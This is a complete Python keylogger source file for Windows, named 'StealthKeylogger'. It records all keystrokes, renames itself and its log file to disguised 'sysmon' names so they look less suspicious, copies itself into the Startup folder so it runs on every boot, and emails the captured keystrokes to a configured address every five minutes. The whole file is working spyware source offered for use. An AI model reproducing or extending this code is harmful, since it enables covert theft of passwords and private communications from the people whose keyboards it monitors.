import os
import sys
import time
import json
import shutil
import threading
import subprocess
from datetime import datetime
from pathlib import Path
from pynput.keyboard import Key, KeyCode

try:
    from pynput import keyboard
    import smtplib
    import ssl
except ImportError:
    print("Required packages missing. Install with: pip install pynput")
    sys.exit(1)

# ═══════════════════════════════════════════════════════════════════════════════
# CONFIGURATION - Use environment variables for security
# ═══════════════════════════════════════════════════════════════════════════════

CONFIG = {
    "sender_email": os.getenv("KEYLOGGER_SENDER", "your_email@gmail.com"),
    "receiver_email": os.getenv("KEYLOGGER_RECEIVER", "your_email@gmail.com"),
    "email_password": os.getenv("KEYLOGGER_PASSWORD", "your_app_password"),
    "smtp_server": "smtp.gmail.com",
    "smtp_port": 587,
    "log_file": "sysmon.log",  # Less suspicious name
    "max_log_size": 1024 * 1024,  # 1MB before sending
    "send_interval": 300,  # 5 minutes
    "startup_folder": os.path.join(os.environ['APPDATA'],
                                   'Microsoft', 'Windows', 'Start Menu',
                                   'Programs', 'Startup'),
    "self_name": "sysmon.pyw"  # Stealthy name
}

# Key mappings for clean outputs
KEY_MAP = {
    Key.space: ' ',
    Key.enter: '\n',
    Key.tab: '\t',
    Key.backspace: '[BACK]',
    Key.delete: '[DEL]',
    Key.esc: '[ESC]',
    Key.caps_lock: '[CAPS]',
    Key.shift: '[SHIFT]',
    Key.ctrl_l: '[CTRL]',
    Key.ctrl_r: '[CTRL]',
    Key.alt_l: '[ALT]',
    Key.alt_r: '[ALT]',
    Key.cmd: '[WIN]',
    Key.f1: '[F1]', Key.f2: '[F2]', Key.f3: '[F3]', Key.f4: '[F4]',
    Key.f5: '[F5]', Key.f6: '[F6]', Key.f7: '[F7]', Key.f8: '[F8]',
    Key.f9: '[F9]', Key.f10: '[F10]', Key.f11: '[F11]', Key.f12: '[F12]'
}

class StealthKeylogger:
    def __init__(self):
        self.log_buffer = []
        self.running = True
        self.last_send = time.time()
        self.ctrl_pressed = False  # Track Ctrl state

        # Ensure stealthy filename
        self.ensure_stealthy_name()

        # Self-install to startup
        self.auto_install_startup()

        print("🚀 Stealth Keylogger started (Press Ctrl+Q to stop)")

    def ensure_stealthy_name(self):
        """Rename script to stealthy name if needed"""
        current_script = Path(__file__)
        stealthy_path = current_script.parent / CONFIG["self_name"]

        if current_script.name != CONFIG["self_name"]:
            current_script.rename(stealthy_path)
            os.chdir(stealthy_path.parent)
            print(f" Renamed to {CONFIG['self_name']}")

    def auto_install_startup(self):
        """Copy self to startup folder for persistence"""
        script_path = Path(__file__).resolve()
        startup_path = Path(CONFIG["startup_folder"]) / CONFIG["self_name"]

        if not startup_path.exists():
            try:
                shutil.copy2(script_path, startup_path)
                print(f" Installed to startup: {startup_path}")
            except Exception as e:
                print(f"  Startup install failed: {e}")

    def log_keystroke(self, key):
        """Log keystroke, handling Ctrl+[A-Z] combos (no timestamp)."""

        try:
            if getattr(self, 'ctrl_pressed', False):
                # When Ctrl-[A-Z] is pressed, key.char is None, but key.vk gives ASCII
                if hasattr(key, 'vk') and 1 <= key.vk <= 26:
                    # Convert ASCII control to uppercase letter
                    char = chr(ord('A') + key.vk - 1)
                    log_entry = f"Ctrl {char}"
                elif isinstance(key, KeyCode) and key.char is not None:
                    log_entry = f"Ctrl {key.char.upper()}"
                else:
                    log_entry = f"Ctrl {KEY_MAP.get(key, repr(key))}"
            else:
                if isinstance(key, KeyCode) and key.char is not None:
                    log_entry = key.char
                else:
                    log_entry = KEY_MAP.get(key, repr(key))

            self.log_buffer.append(log_entry)
            print(log_entry, end='', flush=True)

        except Exception as e:
            self.log_buffer.append(f"[ERROR:{e}]")

    def write_to_file(self):
        """Write buffer to file safely"""
        try:
            log_path = Path(CONFIG["log_file"])
            with log_path.open('a', encoding='utf-8') as f:
                f.write('\n'.join(self.log_buffer) + '\n')
            self.log_buffer.clear()
        except Exception as e:
            print(f"File write error: {e}")

    def should_send_email(self):
        """Check if email should be sent (size or interval)"""
        current_time = time.time()
        log_size = sum(len(entry.encode()) for entry in self.log_buffer)

        return (log_size > CONFIG["max_log_size"] or
                (current_time - self.last_send > CONFIG["send_interval"]))

    def send_email_report(self):
        """Send log via encrypted email"""
        try:
            if not self.log_buffer:
                return

            # Read complete log
            log_path = Path(CONFIG["log_file"])
            if log_path.exists():
                with log_path.open('r', encoding='utf-8') as f:
                    full_log = f.read()
            else:
                full_log = '\n'.join(self.log_buffer)

            # Email content
            subject = f"SysMon Report - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
            body = f"""
🖥️  System Monitor Report
📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
💾 Total Keys Logged: {len(full_log.splitlines())}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{full_log}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

            # Send email
            context = ssl.create_default_context()
            with smtplib.SMTP(CONFIG["smtp_server"], CONFIG["smtp_port"]) as server:
                server.starttls(context=context)
                server.login(CONFIG["sender_email"], CONFIG["email_password"])
                server.sendmail(
                    CONFIG["sender_email"],
                    CONFIG["receiver_email"],
                    f"Subject: {subject}\n\n{body}".encode('utf-8')
                )

            self.last_send = time.time()
            print(f"\n📧 Email sent at {datetime.now().strftime('%H:%M:%S')}")

            # Clear log after successful send
            log_path.unlink(missing_ok=True)

        except Exception as e:
            print(f" Email failed: {e}")

    def periodic_tasks(self):
        """Background tasks: file sync, email sending"""
        while self.running:
            if self.should_send_email():
                self.send_email_report()

            self.write_to_file()
            time.sleep(30)  # Check every 30 seconds

    def on_key_press(self, key):
        """Handle key press events"""
        # Kill switch: Ctrl+Q
        if key in (Key.ctrl_l, Key.ctrl_r):
            self.ctrl_pressed = True
        elif key == KeyCode.from_char('q') and self.ctrl_pressed:
            print("\n  Kill switch activated (Ctrl+Q)")
            return False
        else:
            self.log_keystroke(key)
        return True

    def on_key_release(self, key):
        """Handle key release events"""
        if key in (Key.ctrl_l, Key.ctrl_r):
            self.ctrl_pressed = False

    def start(self):
        """Start the keylogger"""
        # Start background tasks
        task_thread = threading.Thread(target=self.periodic_tasks, daemon=True)
        task_thread.start()

        # Start keyboard listener
        with keyboard.Listener(
                on_press=self.on_key_press,
                on_release=self.on_key_release,
                suppress=False  # Don't block other apps
        ) as listener:
            listener.join()

    def cleanup(self):
        """Clean shutdown"""
        self.running = False
        self.write_to_file()
        self.send_email_report()
        print("🔒 Keylogger stopped cleanly")


def main():
    """Entry point - runs as both .py and .pyw"""
    if len(sys.argv) > 1 and sys.argv[1] == '--install':
        kl = StealthKeylogger()
        kl.auto_install_startup()
        print("Installation complete!")
        return

    try:
        kl = StealthKeylogger()
        kl.start()
    except KeyboardInterrupt:
        print("\n👋 Interrupted by user")
    except Exception as e:
        print(f"💥 Fatal error: {e}")
    finally:
        kl.cleanup() if 'kl' in locals() else None


if __name__ == "__main__":
    main()
